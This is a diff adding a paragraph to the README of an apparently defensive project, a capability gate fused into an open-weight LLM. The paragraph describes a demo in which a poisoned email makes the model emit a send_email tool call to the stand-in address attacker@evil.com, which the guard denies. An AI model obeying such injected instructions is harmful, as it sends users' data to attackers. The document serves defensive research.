@@ -12,6 +12,12 @@ with inspectable decision evidence.
 > model-independent ceiling analysis under perfect provenance separation, not a live-LLM
 > ASR measurement.
 
+> **Live model, CPU:** fused into **Qwen2.5-0.5B-Instruct** (no training), the gate stops a
+> real prompt injection. The model, fed a poisoned email, emits `send_email → attacker@evil.com`;
+> the **same tool call** executes without the guard (attack succeeds) but is `DENY`ed by the
+> fused frozen capability head — while a genuine user-driven send is still allowed. Run it:
+> `python examples/guarded_qwen_demo.py` · see [GuardedQwen](#fused-into-an-open-weight-llm--guardedqwen-cpu).
+
 📖 **Deep dive:** [*Attention as a Capability Machine*](blog/introducing-capability-transformer.md)
 — motivation, full architecture, and how it compares to OPA/Cedar, guardrails, and CaMeL.
 
